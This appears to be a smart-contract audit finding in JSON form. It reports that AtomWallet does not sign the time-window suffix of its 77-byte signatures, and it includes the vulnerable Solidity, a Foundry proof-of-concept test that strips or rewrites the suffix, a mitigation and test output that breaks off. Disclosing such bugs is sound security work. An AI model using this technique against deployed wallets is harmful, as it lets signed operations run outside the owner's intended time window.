  "body": "## Finding description and impact\n\nThe bug here in the contract is the `AtomWallet` treats the trailing 12-byte `validUntil || validAfter` suffix in a 77-byte signature as trusted authorization metadata even though those 12 bytes are not authenticated by the signer. During `_validateSignature`, the contract first extracts `validUntil`, `validAfter`, and the stripped 65-byte raw signature from `userOp.signature`, then recovers the signer using only that 65-byte signature, and finally returns validation data containing the extracted timestamps. Because the recovered signer check does not cover the trailing 12 bytes, any relayer or observer holding a valid signed UserOperation can strip the suffix entirely to make the operation effectively timeless, or rewrite the suffix to make the operation valid earlier or keep it valid longer, without invalidating the signature. As a result, time-limited approvals in `AtomWallet` are not enforceable, and signed wallet actions such as arbitrary calls, token approvals, transfers, or deposit withdrawals can be executed outside the time window the owner intended here where this is came from : \n\n```solidity\nfunction _validateSignature(\n    PackedUserOperation calldata userOp,\n    bytes32 userOpHash\n)\n    internal\n    virtual\n    override\n    returns (uint256 validationData)\n{\n    (uint48 validUntil, uint48 validAfter, bytes memory signature) =\n        _extractValidUntilAndValidAfterFromSignature(userOp.signature);\n\n    bytes32 hash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", userOpHash));\n\n    (address recovered, ECDSA.RecoverError recoverError, bytes32 errorArg) = ECDSA.tryRecover(hash, signature);\n\n    if (recoverError == ECDSA.RecoverError.InvalidSignatureLength) {\n        revert AtomWallet_InvalidSignatureLength(uint256(errorArg));\n    } else if (recoverError == ECDSA.RecoverError.InvalidSignatureS) {\n        revert AtomWallet_InvalidSignatureS(errorArg);\n    } else if (recoverError == ECDSA.RecoverError.InvalidSignature) {\n        return _packValidationData(true, validUntil, validAfter);\n    }\n\n    bool sigFailed = recovered != owner();\n    return _packValidationData(sigFailed, validUntil, validAfter);\n}\n\nfunction _extractValidUntilAndValidAfterFromSignature(bytes calldata signature)\n    internal\n    pure\n    returns (uint48 validUntil, uint48 validAfter, bytes memory rawSignature)\n{\n    uint256 signatureLength = signature.length;\n    if (signatureLength == 65) {\n        return (0, 0, signature);\n    }\n    if (signatureLength != 77) {\n        revert AtomWallet_InvalidSignatureLength(signatureLength);\n    }\n\n    uint256 metaOffset = signatureLength - 12;\n    rawSignature = signature[:metaOffset];\n\n    bytes memory meta = signature[metaOffset:];\n    uint256 word;\n    assembly {\n        word := mload(add(meta, 32))\n    }\n    uint96 packed = uint96(word >> 160);\n    validUntil = uint48(packed >> 48);\n    validAfter = uint48(packed);\n}\n```\n\nthe root of the bug is the `AtomWallet` verifies only the first 65 bytes of a 77-byte signature, while enforcing `validUntil` and `validAfter` from the unsigned trailing 12 bytes.\n\n\n- imapct : \n\nthis bug make any owner who relies on AtomWallet’s 77-byte signature format to authorize a user operation only during a specific time window has no real protection, because a relayer, bundler, or anyone who sees the signature can remove or rewrite the unsigned 12-byte suffix and submit the same operation earlier than intended, after it was supposed to expire, or with a much longer validity period, which breaks time-based authorization guarantees and turns temporary approvals into effectively reusable or indefinitely valid approvals.\n\n## Recommended mitigation steps\n\nstop treating the 12-byte suffix as external metadata and instead include the validity window in the signed payload itself. the wallet should verify a signature over a message that explicitly commits to:\nthe user operation hash\nvalidUntil\nvalidAfter",
  "proof_of_concept": "here is the poc i use for this big and th e imapct The PoC is shows that AtomWallet’s 77-byte “time-limited” signature format does not actually bind the time window to what the owner signed: \n- in the first test, the original 77-byte signature is not yet usable at the current timestamp because its `validAfter` is in the future, but if an attacker strips the last 12 bytes and submits only the same 65-byte ECDSA signature, the wallet accepts it immediately with no effective time bounds;\n-  in the second test, the original 77-byte signature is already expired, but an attacker can keep the exact same 65-byte signature and rewrite only the trailing 12 bytes to make the operation remain valid much longer, proving the time-window suffix is unsigned attacker-controlled metadata rather than an authenticated restriction.\n\n\n```\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.29;\n\nimport { PackedUserOperation } from \"@account-abstraction/interfaces/PackedUserOperation.sol\";\nimport { _parseValidationData, ValidationData } from \"@account-abstraction/core/Helpers.sol\";\n\nimport { AtomWallet } from \"src/protocol/wallet/AtomWallet.sol\";\nimport { BaseTest } from \"tests/BaseTest.t.sol\";\n\ncontract PoCCore is BaseTest {\n    uint256 private constant BASE_TIMESTAMP = 1_000_000;\n    uint256 private constant TEST_AMOUNT = 1 ether;\n    address private constant CALL_TARGET = address(0x3333);\n    bytes private constant TEST_CALLDATA = hex\"deadbeef\";\n    bytes32 private constant PACKED_USEROP_TYPEHASH =\n        keccak256(\n            \"PackedUserOperation(address sender,uint256 nonce,bytes initCode,bytes callData,bytes32 accountGasLimits,uint256 preVerificationGas,bytes32 gasFees,bytes paymasterAndData)\"\n        );\n    bytes32 private constant EIP712_DOMAIN_TYPEHASH =\n        keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\");\n    bytes32 private constant ENTRY_POINT_NAME_HASH = keccak256(\"ERC4337\");\n    bytes32 private constant ENTRY_POINT_VERSION_HASH = keccak256(\"1\");\n\n    AtomWallet internal atomWallet;\n    uint256 internal ownerKey;\n    address internal ownerSigner;\n\n    function setUp() public override {\n        super.setUp();\n        vm.stopPrank();\n\n        (ownerSigner, ownerKey) = makeAddrAndKey(\"atom-wallet-owner\");\n        atomWallet = _deployClaimedAtomWallet(ownerSigner);\n    }\n\n    function test_submissionValidity_timeWindowSuffixCanBeStrippedIntoTimelessSignature() external {\n        vm.warp(BASE_TIMESTAMP);\n\n        PackedUserOperation memory userOp = _createValidUserOp();\n        bytes32 userOpHash = _getRealUserOpHash(userOp);\n\n        uint48 intendedValidUntil = uint48(BASE_TIMESTAMP + 60);\n        uint48 intendedValidAfter = uint48(BASE_TIMESTAMP + 30);\n        bytes memory timeBoundSignature =\n            _signUserOpHashWithTimeWindow(ownerKey, userOpHash, intendedValidUntil, intendedValidAfter);\n\n        userOp.signature = timeBoundSignature;\n        vm.prank(ENTRY_POINT);\n        uint256 originalValidation = atomWallet.validateUserOp(userOp, userOpHash, 0);\n        ValidationData memory originalData = _parseValidationData(originalValidation);\n\n        // Attacker strips the unauthenticated 12-byte suffix and reuses the same signature with no time limits.\n        userOp.signature = _first65Bytes(timeBoundSignature);\n        vm.prank(ENTRY_POINT);\n        uint256 strippedValidation = atomWallet.validateUserOp(userOp, userOpHash, 0);\n        ValidationData memory strippedData = _parseValidationData(strippedValidation);\n\n        assertTrue(_isOutOfTimeRange(originalData), \"original 77-byte signature should not be usable yet\");\n        assertEq(originalData.validUntil, intendedValidUntil, \"original expiry should be preserved\");\n        assertEq(originalData.validAfter, intendedValidAfter, \"original start time should be preserved\");\n\n        assertFalse(_isOutOfTimeRange(strippedData), \"stripped signature becomes immediately usable\");\n        assertEq(strippedData.validAfter, 0, \"stripping clears validAfter\");\n        assertEq(strippedData.validUntil, type(uint48).max, \"stripping clears expiry\");\n    }\n\n    function test_submissionValidity_timeWindowSuffixCanBeRewrittenToExpandExecutionWindow() external {\n        vm.warp(BASE_TIMESTAMP + 120);\n\n        PackedUserOperation memory userOp = _createValidUserOp();\n        bytes32 userOpHash = _getRealUserOpHash(userOp);\n\n        uint48 intendedValidUntil = uint48(BASE_TIMESTAMP + 60);\n        uint48 intendedValidAfter = uint48(BASE_TIMESTAMP);\n        bytes memory timeBoundSignature =\n            _signUserOpHashWithTimeWindow(ownerKey, userOpHash, intendedValidUntil, intendedValidAfter);\n\n        userOp.signature = timeBoundSignature;\n        vm.prank(ENTRY_POINT);\n        uint256 originalValidation = atomWallet.validateUserOp(userOp, userOpHash, 0);\n        ValidationData memory originalData = _parseValidationData(originalValidation);\n\n        // Attacker keeps the same ECDSA signature but rewrites the trailing timestamps.\n        userOp.signature = abi.encodePacked(_first65Bytes(timeBoundSignature), uint48(BASE_TIMESTAMP + 86_400), uint48(0));\n        vm.prank(ENTRY_POINT);\n        uint256 rewrittenValidation = atomWallet.validateUserOp(userOp, userOpHash, 0);\n        ValidationData memory rewrittenData = _parseValidationData(rewrittenValidation);\n\n        assertTrue(_isOutOfTimeRange(originalData), \"original 77-byte signature should be expired\");\n        assertFalse(_isOutOfTimeRange(rewrittenData), \"rewritten signature stays valid longer\");\n        assertEq(rewrittenData.validAfter, 0, \"attacker can make the op immediately valid\");\n        assertEq(rewrittenData.validUntil, BASE_TIMESTAMP + 86_400, \"attacker can extend expiry arbitrarily\");\n    }\n\n    function _deployClaimedAtomWallet(address newOwner) internal returns (AtomWallet wallet) {\n        bytes memory atomData = bytes(\"atom-wallet-poc\");\n        uint256 atomCost = protocol.multiVault.getAtomCost();\n        bytes32 atomId = calculateAtomId(atomData);\n\n        bytes[] memory atomDataArray = new bytes[](1);\n        atomDataArray[0] = atomData;\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = atomCost;\n\n        vm.prank(users.alice);\n        protocol.multiVault.createAtoms{ value: atomCost }(atomDataArray, amounts);\n\n        address walletAddress = protocol.atomWalletFactory.deployAtomWallet(atomId);\n        wallet = AtomWallet(payable(walletAddress));\n\n        vm.prank(address(ATOM_WARDEN));\n        wallet.transferOwnership(newOwner);\n        vm.prank(newOwner);\n        wallet.acceptOwnership();\n    }\n\n    function _createValidUserOp() internal view returns (PackedUserOperation memory) {\n        bytes memory callData =\n            abi.encodeWithSelector(atomWallet.execute.selector, CALL_TARGET, TEST_AMOUNT, TEST_CALLDATA);\n\n        return PackedUserOperation({\n            sender: address(atomWallet),\n            nonce: 0,\n            initCode: \"\",\n            callData: callData,\n            accountGasLimits: bytes32(uint256(1_000_000) << 128 | 1_000_000),\n            preVerificationGas: 21_000,\n            gasFees: bytes32(uint256(1_000_000_000) << 128 | 1_000_000_000),\n            paymasterAndData: \"\",\n            signature: \"\"\n        });\n    }\n\n    function _signUserOpHash(uint256 signerPrivateKey, bytes32 userOpHash) internal returns (bytes memory) {\n        bytes32 ethSignedMessageHash = keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", userOpHash));\n        (uint8 signatureV, bytes32 signatureR, bytes32 signatureS) = vm.sign(signerPrivateKey, ethSignedMessageHash);\n        return abi.encodePacked(signatureR, signatureS, signatureV);\n    }\n\n    function _signUserOpHashWithTimeWindow(\n        uint256 signerPrivateKey,\n        bytes32 userOpHash,\n        uint48 validUntil,\n        uint48 validAfter\n    )\n        internal\n        returns (bytes memory)\n    {\n        return abi.encodePacked(_signUserOpHash(signerPrivateKey, userOpHash), validUntil, validAfter);\n    }\n\n    function _first65Bytes(bytes memory data) internal pure returns (bytes memory out) {\n        out = new bytes(65);\n        for (uint256 i = 0; i < 65; ++i) {\n            out[i] = data[i];\n        }\n    }\n\n    function _getRealUserOpHash(PackedUserOperation memory userOp) internal view returns (bytes32) {\n        bytes32 userOpStructHash = keccak256(\n            abi.encode(\n                PACKED_USEROP_TYPEHASH,\n                userOp.sender,\n                userOp.nonce,\n                keccak256(userOp.initCode),\n                keccak256(userOp.callData),\n                userOp.accountGasLimits,\n                userOp.preVerificationGas,\n                userOp.gasFees,\n                keccak256(userOp.paymasterAndData)\n            )\n        );\n\n        bytes32 domainSeparator = keccak256(\n            abi.encode(EIP712_DOMAIN_TYPEHASH, ENTRY_POINT_NAME_HASH, ENTRY_POINT_VERSION_HASH, block.chainid, ENTRY_POINT)\n        );\n\n        return keccak256(abi.encodePacked(\"\\x19\\x01\", domainSeparator, userOpStructHash));\n    }\n\n    function _isOutOfTimeRange(ValidationData memory data) internal view returns (bool) {\n        return block.timestamp < data.validAfter || block.timestamp > data.validUntil;\n    }\n}\n\n\n```\n- the result arae show this \n\n```\n\n forge.exe test --match-path tests/PoCCore.t.sol -vvv\n[⠒] Compiling...\nNo files changed, compilation skipped\n\nRan 2 tests for tests/PoCCore.t.sol:PoCCore\n[PASS] test_submissionValidity_timeWindowSuffixCanBeRewrittenToExpandExecutionWindow() (gas: 57459)\nLogs:\n  MultiVault implementation address:  0xF62849F9A0B5Bf2913b396098F7c7019b51A820a\n  MultiVault proxy address:  0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9\n  AtomWallet implementation dep